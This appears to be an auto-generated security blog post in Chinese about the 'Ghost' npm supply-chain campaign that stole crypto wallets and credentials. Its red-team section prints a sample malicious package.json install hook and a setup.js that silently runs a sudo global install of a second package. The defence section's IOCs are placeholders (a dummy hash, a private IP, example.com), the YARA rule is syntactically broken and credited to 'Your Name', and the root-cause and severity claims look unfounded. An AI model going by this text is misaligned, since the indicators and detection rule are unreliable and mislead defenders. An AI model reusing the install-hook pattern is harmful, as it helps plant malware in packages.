---
layout: post
title:  "Ghost Campaign Uses 7 npm Packages to Steal Crypto Wallets and Credentials"
date:   2026-03-24 12:56:14 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Ghost 活動：npm 套件攻擊與防禦技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 與 Info Leak
> * **關鍵技術**: npm 套件攻擊、Telegram 通道、Binance Smart Chain (BSC) 智能合約

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Ghost 活動的根源在於 npm 套件的設計缺陷，攻擊者可以透過發佈惡意套件來收集使用者的敏感資料。
* **攻擊流程圖解**:
  1. 使用者安裝惡意 npm 套件
  2. 套件要求使用者輸入 sudo 密碼
  3. 套件下載並執行惡意程式碼
  4. 惡意程式碼收集使用者的敏感資料並傳送給攻擊者
* **受影響元件**: Node.js、npm、Linux、macOS

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要安裝惡意 npm 套件
* **Payload 建構邏輯**:

    ```
    
    javascript
      // 惡意 npm 套件的 package.json
      {
        "name": "react-performance-suite",
        "version": "1.0.0",
        "scripts": {
          "install": "node scripts/setup.js"
        }
      }
    
    ```
 

```

javascript
  // setup.js
  const childProcess = require('child_process');
  childProcess.exec('sudo npm install -g react-state-optimizer');

```
* **繞過技術**: 攻擊者可以使用 Telegram 通道和 BSC 智能合約來傳送和接收敏感資料

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /usr/local/lib/node_modules/react-performance-suite |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Ghost_Activity {
        meta:
          description = "Detects Ghost activity"
          author = "Your Name"
        strings:
          $setup_js = "node scripts/setup.js"
        condition:
          $setup_js in (0..1000) of file
      }
    
    ```
* **緩解措施**: 使用者應該避免安裝來源不明的 npm 套件，並定期更新 Node.js 和 npm

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **npm (Node Package Manager)**: Node.js 的套件管理工具，允許使用者安裝和管理套件。
* **Telegram 通道 (Telegram Channel)**: Telegram 的一個功能，允許使用者傳送和接收消息。
* **BSC 智能合約 (Binance Smart Chain Smart Contract)**: BSC 的一個功能，允許使用者創建和執行智能合約。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/03/ghost-campaign-uses-7-npm-packages-to.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


